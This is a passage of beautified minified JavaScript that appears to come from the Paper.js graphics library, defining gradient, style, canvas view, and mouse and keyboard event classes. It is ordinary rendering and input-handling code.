                            for (var i = this._type, n = this._components, s = e._convert(i), r = 0, o = n.length; r < o; r++) s[r] = t(n[r], s[r]);
                            return new F(i, s, null != this._alpha ? t(this._alpha, e.getAlpha()) : null);
                        };
                    },
                    {}
                );
            })()
        ),
        B = s.extend({
            _class: "Gradient",
            initialize: function (t, e) {
                (this._id = u.get()),
                    t && s.isPlainObject(t) && (this.set(t), (t = e = null)),
                    null == this._stops && this.setStops(t || ["white", "black"]),
                    null == this._radial && this.setRadial(("string" == typeof e && "radial" === e) || e || !1);
            },
            _serialize: function (t, e) {
                return e.add(this, function () {
                    return s.serialize([this._stops, this._radial], t, !0, e);
                });
            },
            _changed: function () {
                for (var t = 0, e = this._owners && this._owners.length; t < e; t++) this._owners[t]._changed();
            },
            _addOwner: function (t) {
                this._owners || (this._owners = []), this._owners.push(t);
            },
            _removeOwner: function (t) {
                var i = this._owners ? this._owners.indexOf(t) : -1;
                -1 != i && (this._owners.splice(i, 1), this._owners.length || (this._owners = e));
            },
            clone: function () {
                for (var t = [], e = 0, i = this._stops.length; e < i; e++) t[e] = this._stops[e].clone();
                return new B(t, this._radial);
            },
            getStops: function () {
                return this._stops;
            },
            setStops: function (t) {
                if (t.length < 2) throw new Error("Gradient stop list needs to contain at least two stops.");
                var i = this._stops;
                if (i) for (var n = 0, s = i.length; n < s; n++) i[n]._owner = e;
                for (n = 0, s = (i = this._stops = H.readList(t, 0, { clone: !0 })).length; n < s; n++) i[n]._owner = this;
                this._changed();
            },
            getRadial: function () {
                return this._radial;
            },
            setRadial: function (t) {
                (this._radial = t), this._changed();
            },
            equals: function (t) {
                if (t === this) return !0;
                if (t && this._class === t._class) {
                    var e = this._stops,
                        i = t._stops,
                        n = e.length;
                    if (n === i.length) {
                        for (var s = 0; s < n; s++) if (!e[s].equals(i[s])) return !1;
                        return !0;
                    }
                }
                return !1;
            },
        }),
        H = s.extend({
            _class: "GradientStop",
            initialize: function (t, i) {
                var n = t,
                    s = i;
                "object" == typeof t && i === e && (Array.isArray(t) && "number" != typeof t[0] ? ((n = t[0]), (s = t[1])) : ("color" in t || "offset" in t || "rampPoint" in t) && ((n = t.color), (s = t.offset || t.rampPoint || 0))),
                    this.setColor(n),
                    this.setOffset(s);
            },
            clone: function () {
                return new H(this._color.clone(), this._offset);
            },
            _serialize: function (t, e) {
                var i = this._color,
                    n = this._offset;
                return s.serialize(null == n ? [i] : [i, n], t, !0, e);
            },
            _changed: function () {
                this._owner && this._owner._changed(129);
            },
            getOffset: function () {
                return this._offset;
            },
            setOffset: function (t) {
                (this._offset = t), this._changed();
            },
            getRampPoint: "#getOffset",
            setRampPoint: "#setOffset",
            getColor: function () {
                return this._color;
            },
            setColor: function () {
                var t = F.read(arguments, 0, { clone: !0 });
                t && (t._owner = this), (this._color = t), this._changed();
            },
            equals: function (t) {
                return t === this || (t && this._class === t._class && this._color.equals(t._color) && this._offset == t._offset) || !1;
            },
        }),
        q = s.extend(
            new (function () {
                var t = {
                        fillColor: null,
                        fillRule: "nonzero",
                        strokeColor: null,
                        strokeWidth: 1,
                        strokeCap: "butt",
                        strokeJoin: "miter",
                        strokeScaling: !0,
                        miterLimit: 10,
                        dashOffset: 0,
                        dashArray: [],
                        shadowColor: null,
                        shadowBlur: 0,
                        shadowOffset: new c(),
                        selectedColor: null,
                    },
                    i = s.set({}, t, { fontFamily: "sans-serif", fontWeight: "normal", fontSize: 12, leading: null, justification: "left" }),
                    n = s.set({}, i, { fillColor: new F() }),
                    r = { strokeWidth: 193, strokeCap: 193, strokeJoin: 193, strokeScaling: 201, miterLimit: 193, fontFamily: 9, fontWeight: 9, fontSize: 9, font: 9, leading: 9, justification: 9 },
                    o = { beans: !0 },
                    a = {
                        _class: "Style",
                        beans: !0,
                        initialize: function (e, s, r) {
                            (this._values = {}), (this._owner = s), (this._project = (s && s._project) || r || st.project), (this._defaults = !s || s instanceof x ? i : s instanceof D ? n : t), e && this.set(e);
                        },
                    };
                return (
                    s.each(i, function (t, i) {
                        var n = /Color$/.test(i),
                            l = "shadowOffset" === i,
                            h = s.capitalize(i),
                            u = r[i],
                            d = "set" + h,
                            f = "get" + h;
                        (a[d] = function (t) {
                            var s = this._owner,
                                r = s && s._children,
                                o = r && r.length > 0 && !(s instanceof L);
                            if (o) for (var a = 0, l = r.length; a < l; a++) r[a]._style[d](t);
                            if (("selectedColor" === i || !o) && i in this._defaults) {
                                var h = this._values[i];
                                h !== t &&
                                    (n && (h && h._owner !== e && ((h._owner = e), (h._canvasStyle = null)), t && t.constructor === F && (t._owner && (t = t.clone()), (t._owner = s))), (this._values[i] = t), s && s._changed(u || 129));
                            }
                        }),
                            (a[f] = function (t) {
                                var r,
                                    o = this._owner,
                                    a = o && o._children;
                                if (i in this._defaults && (!a || !a.length || t || o instanceof L))
                                    if ((r = this._values[i]) === e) (r = this._defaults[i]) && r.clone && (r = r.clone());
                                    else {
                                        var h = n ? F : l ? c : null;
                                        !h || (r && r.constructor === h) || ((this._values[i] = r = h.read([r], 0, { readNull: !0, clone: !0 })), r && n && (r._owner = o));
                                    }
                                else if (a)
                                    for (var u = 0, d = a.length; u < d; u++) {
                                        var p = a[u]._style[f]();
                                        if (u) {
                                            if (!s.equals(r, p)) return e;
                                        } else r = p;
                                    }
                                return r;
                            }),
                            (o[f] = function (t) {
                                return this._style[f](t);
                            }),
                            (o[d] = function (t) {
                                this._style[d](t);
                            });
                    }),
                    s.each({ Font: "FontFamily", WindingRule: "FillRule" }, function (t, e) {
                        var i = "get" + e,
                            n = "set" + e;
                        (a[i] = o[i] = "#get" + t), (a[n] = o[n] = "#set" + t);
                    }),
                    w.inject(o),
                    a
                );
            })(),
            {
                set: function (t) {
                    var e = t instanceof q,
                        i = e ? t._values : t;
                    if (i)
                        for (var n in i)
                            if (n in this._defaults) {
                                var s = i[n];
                                this[n] = s && e && s.clone ? s.clone() : s;
                            }
                },
                equals: function (t) {
                    function i(t, i, n) {
                        var r = t._values,
                            o = i._values,
                            a = i._defaults;
                        for (var l in r) {
                            var h = r[l],
                                u = o[l];
                            if (!((n && l in o) || s.equals(h, u === e ? a[l] : u))) return !1;
                        }
                        return !0;
                    }
                    return t === this || (t && this._class === t._class && i(this, t) && i(t, this, !0)) || !1;
                },
                _dispose: function () {
                    var t;
                    (t = this.getFillColor()) && (t._canvasStyle = null), (t = this.getStrokeColor()) && (t._canvasStyle = null), (t = this.getShadowColor()) && (t._canvasStyle = null);
                },
                hasFill: function () {
                    var t = this.getFillColor();
                    return !!t && t.alpha > 0;
                },
                hasStroke: function () {
                    var t = this.getStrokeColor();
                    return !!t && t.alpha > 0 && this.getStrokeWidth() > 0;
                },
                hasShadow: function () {
                    var t = this.getShadowColor();
                    return !!t && t.alpha > 0 && (this.getShadowBlur() > 0 || !this.getShadowOffset().isZero());
                },
                getView: function () {
                    return this._project._view;
                },
                getFontStyle: function () {
                    var t = this.getFontSize();
                    return this.getFontWeight() + " " + t + (/[a-z]/i.test(t + "") ? " " : "px ") + this.getFontFamily();
                },
                getFont: "#getFontFamily",
                setFont: "#setFontFamily",
                getLeading: function t() {
                    var e = t.base.call(this),
                        i = this.getFontSize();
                    return /pt|em|%|px/.test(i) && (i = this.getView().getPixelSize(i)), null != e ? e : 1.2 * i;
                },
            }
        ),
        R = new (function () {
            function t(t, e, i, n) {
                for (var s = ["", "webkit", "moz", "Moz", "ms", "o"], r = e[0].toUpperCase() + e.substring(1), o = 0; o < 6; o++) {
                    var a = s[o],
                        l = a ? a + r : e;
                    if (l in t) {
                        if (!i) return t[l];
                        t[l] = n;
                        break;
                    }
                }
            }
            return {
                getStyles: function (t) {
                    var e = t && 9 !== t.nodeType ? t.ownerDocument : t,
                        i = e && e.defaultView;
                    return i && i.getComputedStyle(t, "");
                },
                getBounds: function (t, e) {
                    var i,
                        n = t.ownerDocument,
                        s = n.body,
                        r = n.documentElement;
                    try {
                        i = t.getBoundingClientRect();
                    } catch (t) {
                        i = { left: 0, top: 0, width: 0, height: 0 };
                    }
                    var o = i.left - (r.clientLeft || s.clientLeft || 0),
                        a = i.top - (r.clientTop || s.clientTop || 0);
                    if (!e) {
                        var l = n.defaultView;
                        (o += l.pageXOffset || r.scrollLeft || s.scrollLeft), (a += l.pageYOffset || r.scrollTop || s.scrollTop);
                    }
                    return new g(o, a, i.width, i.height);
                },
                getViewportBounds: function (t) {
                    var e = t.ownerDocument,
                        i = e.defaultView,
                        n = e.documentElement;
                    return new g(0, 0, i.innerWidth || n.clientWidth, i.innerHeight || n.clientHeight);
                },
                getOffset: function (t, e) {
                    return R.getBounds(t, e).getPoint();
                },
                getSize: function (t) {
                    return R.getBounds(t, !0).getSize();
                },
                isInvisible: function (t) {
                    return R.getSize(t).equals(new f(0, 0));
                },
                isInView: function (t) {
                    return !R.isInvisible(t) && R.getViewportBounds(t).intersects(R.getBounds(t, !0));
                },
                isInserted: function (t) {
                    return n.body.contains(t);
                },
                getPrefixed: function (e, i) {
                    return e && t(e, i);
                },
                setPrefixed: function (e, i, n) {
                    if ("object" == typeof i) for (var s in i) t(e, s, !0, i[s]);
                    else t(e, i, !0, n);
                },
            };
        })(),
        W = {
            add: function (t, e) {
                if (t)
                    for (var i in e)
                        for (var s = e[i], r = i.split(/[\s,]+/g), o = 0, a = r.length; o < a; o++) {
                            var l = r[o],
                                h = t === n && ("touchstart" === l || "touchmove" === l) && { passive: !1 };
                            t.addEventListener(l, s, h);
                        }
            },
            remove: function (t, e) {
                if (t) for (var i in e) for (var n = e[i], s = i.split(/[\s,]+/g), r = 0, o = s.length; r < o; r++) t.removeEventListener(s[r], n, !1);
            },
            getPoint: function (t) {
                var e = t.targetTouches ? (t.targetTouches.length ? t.targetTouches[0] : t.changedTouches[0]) : t;
                return new c(e.pageX || e.clientX + n.documentElement.scrollLeft, e.pageY || e.clientY + n.documentElement.scrollTop);
            },
            getTarget: function (t) {
                return t.target || t.srcElement;
            },
            getRelatedTarget: function (t) {
                return t.relatedTarget || t.toElement;
            },
            getOffset: function (t, e) {
                return W.getPoint(t).subtract(R.getOffset(e || W.getTarget(t)));
            },
        };
    W.requestAnimationFrame = new (function () {
        var t,
            e = R.getPrefixed(i, "requestAnimationFrame"),
            n = !1,
            s = [];
        function r() {
            var t = s;
            s = [];
            for (var i = 0, o = t.length; i < o; i++) t[i]();
            (n = e && s.length) && e(r);
        }
        return function (i) {
            s.push(i), e ? n || (e(r), (n = !0)) : t || (t = setInterval(r, 1e3 / 60));
        };
    })();
    var V = s.extend(
            r,
            {
                _class: "View",
                initialize: function t(e, s) {
                    function r(t) {
                        return s[t] || parseInt(s.getAttribute(t), 10);
                    }
                    function a() {
                        var t = R.getSize(s);
                        return t.isNaN() || t.isZero() ? new f(r("width"), r("height")) : t;
                    }
                    var l;
                    if (i && s) {
                        (this._id = s.getAttribute("id")), null == this._id && s.setAttribute("id", (this._id = "view-" + t._id++)), W.add(s, this._viewEvents);
                        var h = "none";
                        if ((R.setPrefixed(s.style, { userDrag: h, userSelect: h, touchCallout: h, contentZooming: h, tapHighlightColor: "rgba(0,0,0,0)" }), o.hasAttribute(s, "resize"))) {
                            var u = this;
                            W.add(
                                i,
                                (this._windowEvents = {
                                    resize: function () {
                                        u.setViewSize(a());
                                    },
                                })
                            );
                        }
                        if (((l = a()), o.hasAttribute(s, "stats") && "undefined" != typeof Stats)) {
                            this._stats = new Stats();
                            var c = this._stats.domElement,
                                d = c.style,
                                p = R.getOffset(s);
                            (d.position = "absolute"), (d.left = p.x + "px"), (d.top = p.y + "px"), n.body.appendChild(c);
                        }
                    } else (l = new f(s)), (s = null);
                    (this._project = e),
                        (this._scope = e._scope),
                        (this._element = s),
                        this._pixelRatio || (this._pixelRatio = (i && i.devicePixelRatio) || 1),
                        this._setElementSize(l.width, l.height),
                        (this._viewSize = l),
                        t._views.push(this),
                        (t._viewsById[this._id] = this),
                        ((this._matrix = new m())._owner = this),
                        t._focused || (t._focused = this),
                        (this._frameItems = {}),
                        (this._frameItemCount = 0),
                        (this._itemEvents = { native: {}, virtual: {} }),
                        (this._autoUpdate = !st.agent.node),
                        (this._needsUpdate = !1);
                },
                remove: function () {
                    if (!this._project) return !1;
                    V._focused === this && (V._focused = null), V._views.splice(V._views.indexOf(this), 1), delete V._viewsById[this._id];
                    var t = this._project;
                    return (
                        t._view === this && (t._view = null),
                        W.remove(this._element, this._viewEvents),
                        W.remove(i, this._windowEvents),
                        (this._element = this._project = null),
                        this.off("frame"),
                        (this._animate = !1),
                        (this._frameItems = {}),
                        !0
                    );
                },
                _events: s.each(
                    w._itemHandlers.concat(["onResize", "onKeyDown", "onKeyUp"]),
                    function (t) {
                        this[t] = {};
                    },
                    {
                        onFrame: {
                            install: function () {
                                this.play();
                            },
                            uninstall: function () {
                                this.pause();
                            },
                        },
                    }
                ),
                _animate: !1,
                _time: 0,
                _count: 0,
                getAutoUpdate: function () {
                    return this._autoUpdate;
                },
                setAutoUpdate: function (t) {
                    (this._autoUpdate = t), t && this.requestUpdate();
                },
                update: function () {},
                draw: function () {
                    this.update();
                },
                requestUpdate: function () {
                    if (!this._requested) {
                        var t = this;
                        W.requestAnimationFrame(function () {
                            if (((t._requested = !1), t._animate)) {
                                t.requestUpdate();
                                var e = t._element;
                                (R.getPrefixed(n, "hidden") && "true" !== o.getAttribute(e, "keepalive")) || !R.isInView(e) || t._handleFrame();
                            }
                            t._autoUpdate && t.update();
                        }),
                            (this._requested = !0);
                    }
                },
                play: function () {
                    (this._animate = !0), this.requestUpdate();
                },
                pause: function () {
                    this._animate = !1;
                },
                _handleFrame: function () {
                    st = this._scope;
                    var t = Date.now() / 1e3,
                        e = this._last ? t - this._last : 0;
                    (this._last = t), this.emit("frame", new s({ delta: e, time: (this._time += e), count: this._count++ })), this._stats && this._stats.update();
                },
                _animateItem: function (t, e) {
                    var i = this._frameItems;
                    e ? ((i[t._id] = { item: t, time: 0, count: 0 }), 1 == ++this._frameItemCount && this.on("frame", this._handleFrameItems)) : (delete i[t._id], 0 == --this._frameItemCount && this.off("frame", this._handleFrameItems));
                },
                _handleFrameItems: function (t) {
                    for (var e in this._frameItems) {
                        var i = this._frameItems[e];
                        i.item.emit("frame", new s(t, { time: (i.time += t.delta), count: i.count++ }));
                    }
                },
                _changed: function () {
                    this._project._changed(4097), (this._bounds = this._decomposed = e);
                },
                getElement: function () {
                    return this._element;
                },
                getPixelRatio: function () {
                    return this._pixelRatio;
                },
                getResolution: function () {
                    return 72 * this._pixelRatio;
                },
                getViewSize: function () {
                    var t = this._viewSize;
                    return new p(t.width, t.height, this, "setViewSize");
                },
                setViewSize: function () {
                    var t = f.read(arguments),
                        e = t.subtract(this._viewSize);
                    e.isZero() || (this._setElementSize(t.width, t.height), this._viewSize.set(t), this._changed(), this.emit("resize", { size: t, delta: e }), this._autoUpdate && this.update());
                },
                _setElementSize: function (t, e) {
                    var i = this._element;
                    i && (i.width !== t && (i.width = t), i.height !== e && (i.height = e));
                },
                getBounds: function () {
                    return this._bounds || (this._bounds = this._matrix.inverted()._transformBounds(new g(new c(), this._viewSize))), this._bounds;
                },
                getSize: function () {
                    return this.getBounds().getSize();
                },
                isVisible: function () {
                    return R.isInView(this._element);
                },
                isInserted: function () {
                    return R.isInserted(this._element);
                },
                getPixelSize: function (t) {
                    var e,
                        i = this._element;
                    if (i) {
                        var s = i.parentNode,
                            r = n.createElement("div");
                        (r.style.fontSize = t), s.appendChild(r), (e = parseFloat(R.getStyles(r).fontSize)), s.removeChild(r);
                    } else e = parseFloat(e);
                    return e;
                },
                getTextWidth: function (t, e) {
                    return 0;
                },
            },
            s.each(
                ["rotate", "scale", "shear", "skew"],
                function (t) {
                    var e = "rotate" === t;
                    this[t] = function () {
                        var i = (e ? s : c).read(arguments),
                            n = c.read(arguments, 0, { readNull: !0 });
                        return this.transform(new m()[t](i, n || this.getCenter(!0)));
                    };
                },
                {
                    _decompose: function () {
                        return this._decomposed || (this._decomposed = this._matrix.decompose());
                    },
                    translate: function () {
                        var t = new m();
                        return this.transform(t.translate.apply(t, arguments));
                    },
                    getCenter: function () {
                        return this.getBounds().getCenter();
                    },
                    setCenter: function () {
                        var t = c.read(arguments);
                        this.translate(this.getCenter().subtract(t));
                    },
                    getZoom: function () {
                        var t = this._decompose().scaling;
                        return (t.x + t.y) / 2;
                    },
                    setZoom: function (t) {
                        this.transform(new m().scale(t / this.getZoom(), this.getCenter()));
                    },
                    getRotation: function () {
                        return this._decompose().rotation;
                    },
                    setRotation: function (t) {
                        var e = this.getRotation();
                        null != e && null != t && this.rotate(t - e);
                    },
                    getScaling: function () {
                        var t = this._decompose().scaling;
                        return new d(t.x, t.y, this, "setScaling");
                    },
                    setScaling: function () {
                        var t = this.getScaling(),
                            e = c.read(arguments, 0, { clone: !0, readNull: !0 });
                        t && e && this.scale(e.x / t.x, e.y / t.y);
                    },
                    getMatrix: function () {
                        return this._matrix;
                    },
                    setMatrix: function () {
                        var t = this._matrix;
                        t.initialize.apply(t, arguments);
                    },
                    transform: function (t) {
                        this._matrix.append(t);
                    },
                    scrollBy: function () {
                        this.translate(c.read(arguments).negate());
                    },
                }
            ),
            {
                projectToView: function () {
                    return this._matrix._transformPoint(c.read(arguments));
                },
                viewToProject: function () {
                    return this._matrix._inverseTransform(c.read(arguments));
                },
                getEventPoint: function (t) {
                    return this.viewToProject(W.getOffset(t, this._element));
                },
            },
            {
                statics: {
                    _views: [],
                    _viewsById: {},
                    _id: 0,
                    create: function (t, e) {
                        return n && "string" == typeof e && (e = n.getElementById(e)), new (i ? U : V)(t, e);
                    },
                },
            },
            new (function () {
                if (i) {
                    var t,
                        e,
                        s,
                        r,
                        o,
                        a = !1,
                        l = !1,
                        h = i.navigator;
                    h.pointerEnabled || h.msPointerEnabled
                        ? ((s = "pointerdown MSPointerDown"), (r = "pointermove MSPointerMove"), (o = "pointerup pointercancel MSPointerUp MSPointerCancel"))
                        : ((s = "touchstart"),
                          (r = "touchmove"),
                          (o = "touchend touchcancel"),
                          ("ontouchstart" in i && h.userAgent.match(/mobile|tablet|ip(ad|hone|od)|android|silk/i)) || ((s += " mousedown"), (r += " mousemove"), (o += " mouseup")));
                    var u = {},
                        c = {
                            mouseout: function (t) {
                                var e = V._focused,
                                    i = W.getRelatedTarget(t);
                                if (e && (!i || "HTML" === i.nodeName)) {
                                    var n = W.getOffset(t, e._element),
                                        s = n.x,
                                        r = Math.abs,
                                        o = r(s),
                                        a = o - (1 << 25);
                                    (n.x = r(a) < o ? a * (s < 0 ? -1 : 1) : s), I(e, t, e.viewToProject(n));
                                }
                            },
                            scroll: k,
                        };
                    (u[s] = function (t) {
                        var e = (V._focused = T(t));
                        a || ((a = !0), e._handleMouseEvent("mousedown", t));
                    }),
                        (c[r] = function (i) {
                            var n = V._focused;
                            if (!l) {
                                var s = T(i);
                                s ? n !== s && (n && I(n, i), t || (t = n), (n = V._focused = e = s)) : e && e === n && (t && !t.isInserted() && (t = null), (n = V._focused = t), (t = null), k());
                            }
                            n && I(n, i);
                        }),
                        (c[s] = function () {
                            l = !0;
                        }),
                        (c[o] = function (t) {
                            var e = V._focused;
                            e && a && e._handleMouseEvent("mouseup", t), (l = a = !1);
                        }),
                        W.add(n, c),
                        W.add(i, { load: k });
                    var d,
                        f,
                        p,
                        g,
                        v,
                        m,
                        _,
                        y,
                        w = !1,
                        x = !1,
                        b = { doubleclick: "click", mousedrag: "mousemove" },
                        S = !1,
                        C = { mousedown: { mousedown: 1, mousedrag: 1, click: 1, doubleclick: 1 }, mouseup: { mouseup: 1, mousedrag: 1, click: 1, doubleclick: 1 }, mousemove: { mousedrag: 1, mousemove: 1, mouseenter: 1, mouseleave: 1 } };
                    return {
                        _viewEvents: u,
                        _handleMouseEvent: function (t, e, i) {
                            var n = this._itemEvents,
                                s = n.native[t],
                                r = "mousemove" === t,
                                o = this._scope.tool,
                                l = this;
                            function h(t) {
                                return n.virtual[t] || l.responds(t) || (o && o.responds(t));
                            }
                            r && a && h("mousedrag") && (t = "mousedrag"), i || (i = this.getEventPoint(e));
                            var u = this.getBounds().contains(i),
                                c = s && u && l._project.hitTest(i, { tolerance: 0, fill: !0, stroke: !0 }),
                                b = (c && c.item) || null,
                                C = !1,
                                T = {};
                            if (
                                ((T[t.substr(5)] = !0),
                                s && b !== g && (g && O(g, null, "mouseleave", e, i), b && O(b, null, "mouseenter", e, i), (g = b)),
                                S ^ u && (O(this, null, u ? "mouseenter" : "mouseleave", e, i), u ? this : null, (C = !0)),
                                (!u && !T.drag) || i.equals(f) || (P(this, b, r ? t : "mousemove", e, i, f), (C = !0)),
                                (S = u),
                                (T.down && u) || (T.up && d))
                            ) {
                                if ((P(this, b, t, e, i, d), T.down)) {
                                    if (((y = b === m && Date.now() - _ < 300), (p = m = b), !x && b)) {
                                        for (var k = b; k && !k.responds("mousedrag"); ) k = k._parent;
                                        k && (v = b);
                                    }
                                    d = i;
                                } else T.up && (x || b !== p || ((_ = Date.now()), P(this, b, y ? "doubleclick" : "click", e, i, d), (y = !1)), (p = v = null));
                                (S = !1), (C = !0);
                            }
                            (f = i), C && o && (w = o._handleMouseEvent(t, e, i, T) || w), !1 !== e.cancelable && ((w && !T.move) || (T.down && h("mouseup"))) && e.preventDefault();
                        },
                        _handleKeyEvent: function (t, e, i, n) {
                            var s,
                                r = this._scope,
                                o = r.tool;
                            function a(o) {
                                o.responds(t) && ((st = r), o.emit(t, (s = s || new Y(t, e, i, n))));
                            }
                            this.isVisible() && (a(this), o && o.responds(t) && a(o));
                        },
                        _countItemEvent: function (t, e) {
                            var i = this._itemEvents,
                                n = i.native,
                                s = i.virtual;
                            for (var r in C) n[r] = (n[r] || 0) + (C[r][t] || 0) * e;
                            s[t] = (s[t] || 0) + e;
                        },
                        statics: {
                            updateFocus: k,
                            _resetState: function () {
                                (a = l = w = S = !1), (t = e = d = f = p = g = v = m = _ = y = null);
                            },
                        },
                    };
                }
                function T(t) {
                    var e = W.getTarget(t);
                    return e.getAttribute && V._viewsById[e.getAttribute("id")];
                }
                function k() {
                    var t = V._focused;
                    if (!t || !t.isVisible())
                        for (var i = 0, n = V._views.length; i < n; i++)
                            if ((t = V._views[i]).isVisible()) {
                                V._focused = e = t;
                                break;
                            }
                }
                function I(t, e, i) {
                    t._handleMouseEvent("mousemove", e, i);
                }
                function O(t, e, i, n, s, r, o) {
                    var a,
                        l = !1;
                    function h(t, i) {
                        if (t.responds(i)) {
                            if ((a || (a = new G(i, n, s, e || t, r ? s.subtract(r) : null)), t.emit(i, a) && ((w = !0), a.prevented && (x = !0), a.stopped))) return (l = !0);
                        } else {
                            var o = b[i];
                            if (o) return h(t, o);
                        }
                    }
                    for (; t && t !== o && !h(t, i); ) t = t._parent;
                    return l;
                }
                function P(t, e, i, n, s, r) {
                    return t._project.removeOn(i), (x = w = !1), (v && O(v, null, i, n, s, r)) || (e && e !== v && !e.isDescendant(v) && O(e, null, "mousedrag" === i ? "mousemove" : i, n, s, r, v)) || O(t, v || e || t, i, n, s, r);
                }
            })()
        ),
        U = V.extend({
            _class: "CanvasView",
            initialize: function (t, e) {
                if (!(e instanceof i.HTMLCanvasElement)) {
                    var n = f.read(arguments, 1);
                    if (n.isZero()) throw new Error("Cannot create CanvasView with the provided argument: " + s.slice(arguments, 1));
                    e = tt.getCanvas(n);
                }
                var r = (this._context = e.getContext("2d"));
                if ((r.save(), (this._pixelRatio = 1), !/^off|false$/.test(o.getAttribute(e, "hidpi")))) {
                    var a = i.devicePixelRatio || 1,
                        l = R.getPrefixed(r, "backingStorePixelRatio") || 1;
                    this._pixelRatio = a / l;
                }
                V.call(this, t, e), (this._needsUpdate = !0);
            },
            remove: function t() {
                return this._context.restore(), t.base.call(this);
            },
            _setElementSize: function t(e, i) {
                var n = this._pixelRatio;
                if ((t.base.call(this, e * n, i * n), 1 !== n)) {
                    var s = this._element,
                        r = this._context;
                    if (!o.hasAttribute(s, "resize")) {
                        var a = s.style;
                        (a.width = e + "px"), (a.height = i + "px");
                    }
                    r.restore(), r.save(), r.scale(n, n);
                }
            },
            getContext: function () {
                return this._context;
            },
            getPixelSize: function t(e) {
                var i,
                    n = st.agent;
                if (n && n.firefox) i = t.base.call(this, e);
                else {
                    var s = this._context,
                        r = s.font;
                    (s.font = e + " serif"), (i = parseFloat(s.font)), (s.font = r);
                }
                return i;
            },
            getTextWidth: function (t, e) {
                var i = this._context,
                    n = i.font,
                    s = 0;
                i.font = t;
                for (var r = 0, o = e.length; r < o; r++) s = Math.max(s, i.measureText(e[r]).width);
                return (i.font = n), s;
            },
            update: function () {
                if (!this._needsUpdate) return !1;
                var t = this._project,
                    e = this._context,
                    i = this._viewSize;
                return e.clearRect(0, 0, i.width + 1, i.height + 1), t && t.draw(e, this._matrix, this._pixelRatio), (this._needsUpdate = !1), !0;
            },
        }),
        Z = s.extend({
            _class: "Event",
            initialize: function (t) {
                (this.event = t), (this.type = t && t.type);
            },
            prevented: !1,
            stopped: !1,
            preventDefault: function () {
                (this.prevented = !0), this.event.preventDefault();
            },
            stopPropagation: function () {
                (this.stopped = !0), this.event.stopPropagation();
            },
            stop: function () {
                this.stopPropagation(), this.preventDefault();
            },
            getTimeStamp: function () {
                return this.event.timeStamp;
            },
            getModifiers: function () {
                return Q.modifiers;
            },
        }),
        Y = Z.extend({
            _class: "KeyEvent",
            initialize: function (t, e, i, n) {
                (this.type = t), (this.event = e), (this.key = i), (this.character = n);
            },
            toString: function () {
                return "{ type: '" + this.type + "', key: '" + this.key + "', character: '" + this.character + "', modifiers: " + this.getModifiers() + " }";
            },
        }),
        Q = new (function () {
            var t,
                r,
                o = { "\t": "tab", " ": "space", "\b": "backspace", "": "delete", Spacebar: "space", Del: "delete", Win: "meta", Esc: "escape" },
                a = { tab: "\t", space: " ", enter: "\r" },
                l = {},
                h = {},
                u = new s({ shift: !1, control: !1, alt: !1, meta: !1, capsLock: !1, space: !1 }).inject({
                    option: {
                        get: function () {
                            return this.alt;
                        },
                    },
                    command: {
                        get: function () {
                            var t = st && st.agent;
                            return t && t.mac ? this.meta : this.control;
                        },
                    },
                });
            function c(t) {
                var i = t.key || t.keyIdentifier;
                return (
                    (i = /^U\+/.test(i) ? String.fromCharCode(parseInt(i.substr(2), 16)) : /^Arrow[A-Z]/.test(i) ? i.substr(5) : "Unidentified" === i || i === e ? String.fromCharCode(t.keyCode) : i),
                    o[i] || (i.length > 1 ? s.hyphenate(i) : i.toLowerCase())
                );
            }
            function d(e, i, n, r) {
                var o,
                    a = V._focused;
                if (((l[i] = e), e ? (h[i] = n) : delete h[i], i.length > 1 && (o = s.camelize(i)) in u)) {
                    u[o] = e;
                    var c = st && st.agent;
                    if ("meta" === o && c && c.mac)
                        if (e) t = {};
                        else {
                            for (var f in t) f in h && d(!1, f, t[f], r);
                            t = null;
                        }
                } else e && t && (t[i] = n);
                a && a._handleKeyEvent(e ? "keydown" : "keyup", r, i, n);
            }
            return (
                W.add(n, {
                    keydown: function (t) {
                        var e = c(t),
                            i = st && st.agent;
                        e.length > 1 || (i && i.chrome && (t.altKey || (i.mac && t.metaKey) || (!i.mac && t.ctrlKey))) ? d(!0, e, a[e] || (e.length > 1 ? "" : e), t) : (r = e);
                    },
                    keypress: function (t) {
                        if (r) {
                            var e = c(t),
                                i = t.charCode,
                                n = i >= 32 ? String.fromCharCode(i) : e.length > 1 ? "" : e;
                            e !== r && (e = n.toLowerCase()), d(!0, e, n, t), (r = null);
                        }
                    },
                    keyup: function (t) {
                        var e = c(t);
                        e in h && d(!1, e, h[e], t);
                    },
                }),
                W.add(i, {
                    blur: function (t) {
                        for (var e in h) d(!1, e, h[e], t);
                    },
                }),
                {
                    modifiers: u,
                    isDown: function (t) {
                        return !!l[t];
                    },
                }
            );
        })(),
        G = Z.extend({
            _class: "MouseEvent",
            initialize: function (t, e, i, n, s) {
                (this.type = t), (this.event = e), (this.point = i), (this.target = n), (this.delta = s);
            },
            toString: function () {
                return "{ type: '" + this.type + "', point: " + this.point + ", target: " + this.target + (this.delta ? ", delta: " + this.delta : "") + ", modifiers: " + this.getModifiers() + " }";
            },
        }),
        X = Z.extend({
            _class: "ToolEvent",
            _item: null,
            initialize: function (t, e, i) {
                (this.tool = t), (this.type = e), (this.event = i);
            },
            _choosePoint: function (t, e) {
                return t || (e ? e.clone() : null);
            },
            getPoint: function () {
                return this._choosePoint(this._point, this.tool._point);
            },
            setPoint: function (t) {
                this._point = t;
            },
            getLastPoint: function () {
                return this._choosePoint(this._lastPoint, this.tool._lastPoint);
            },
            setLastPoint: function (t) {
                this._lastPoint = t;
            },
            getDownPoint: function () {
                return this._choosePoint(this._downPoint, this.tool._downPoint);
            },
            setDownPoint: function (t) {
                this._downPoint = t;
            },
            getMiddlePoint: function () {
                return !this._middlePoint && this.tool._lastPoint ? this.tool._point.add(this.tool._lastPoint).divide(2) : this._middlePoint;
            },
            setMiddlePoint: function (t) {
                this._middlePoint = t;
            },
            getDelta: function () {
                return !this._delta && this.tool._lastPoint ? this.tool._point.subtract(this.tool._lastPoint) : this._delta;
            },
            setDelta: function (t) {
                this._delta = t;
            },
            getCount: function () {
                return this.tool[/^mouse(down|up)$/.test(this.type) ? "_downCount" : "_moveCount"];
            },
            setCount: function (t) {
                this.tool[/^mouse(down|up)$/.test(this.type) ? "downCount" : "count"] = t;
            },
            getItem: function () {
                if (!this._item) {
                    var t = this.tool._scope.project.hitTest(this.getPoint());
                    if (t) {
                        for (var e = t.item, i = e._parent; /^(Group|CompoundPath)$/.test(i._class); ) (e = i), (i = i._parent);
                        this._item = e;
                    }
                }
                return this._item;
            },
            setItem: function (t) {
                this._item = t;
            },
            toString: function () {
